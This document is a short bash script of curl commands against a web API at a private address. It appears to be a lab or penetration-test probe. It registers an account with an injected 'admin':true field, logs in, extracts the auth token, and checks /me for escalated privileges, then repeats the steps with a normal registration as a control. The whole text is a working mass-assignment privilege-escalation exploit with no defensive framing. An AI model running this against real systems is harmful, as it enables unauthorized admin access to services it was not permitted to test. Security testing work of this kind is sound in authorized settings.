B=http://172.20.0.5:5000
U=brkMA7742
echo "--- register WITH an extra admin field ---"
curl -s --max-time 15 -X POST $B/users/v1/register -H "Content-Type: application/json" \
  -d "{\"username\":\"$U\",\"password\":\"Pw1$U\",\"email\":\"$U@t.io\",\"admin\":true}"; echo
T=$(curl -s --max-time 15 -X POST $B/users/v1/login -H "Content-Type: application/json" -d "{\"username\":\"$U\",\"password\":\"Pw1$U\"}" | sed -n 's/.*"auth_token": "\([^"]*\)".*/\1/p')
echo "--- what does the server think we are? ---"
curl -s --max-time 15 -H "Authorization: Bearer $T" $B/me; echo
echo "--- control: a normal registration ---"
V=brkNM7742
curl -s --max-time 15 -X POST $B/users/v1/register -H "Content-Type: application/json" -d "{\"username\":\"$V\",\"password\":\"Pw1$V\",\"email\":\"$V@t.io\"}" >/dev/null
T2=$(curl -s --max-time 15 -X POST $B/users/v1/login -H "Content-Type: application/json" -d "{\"username\":\"$V\",\"password\":\"Pw1$V\"}" | sed -n 's/.*"auth_token": "\([^"]*\)".*/\1/p')
curl -s --max-time 15 -H "Authorization: Bearer $T2" $B/me; echo
